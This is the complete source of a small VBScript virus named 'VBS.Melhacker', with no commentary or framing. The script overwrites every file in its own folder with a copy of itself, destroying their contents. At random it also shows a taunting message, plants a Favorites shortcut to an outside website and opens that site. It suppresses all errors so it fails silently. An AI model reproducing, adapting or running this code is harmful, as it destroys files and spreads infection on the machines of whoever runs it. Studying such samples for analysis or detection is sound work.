Dim Melhacker, WshShell, FSO, VX, VirusLink
On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Melhacker = Wscript.ScriptFullName
VX = Left(Melhacker, InStrRev(Melhacker, "\"))
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile Melhacker, target.Name, 1
Next
If Int((2 * Rnd) + 1) = 1 Then
  MsgBox "Melhacker Has Your!", 4096 , "VBS.Melhacker"
  Set VirusLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\Melhacker.URL")
  VirusLink.TargetPath = "http://www.melhacker.netfirms.com"
  VirusLink.Save
  WshShell.Run ("C:\WINDOWS\Favorites\Melhacker.URL")
End If
'Melhacker
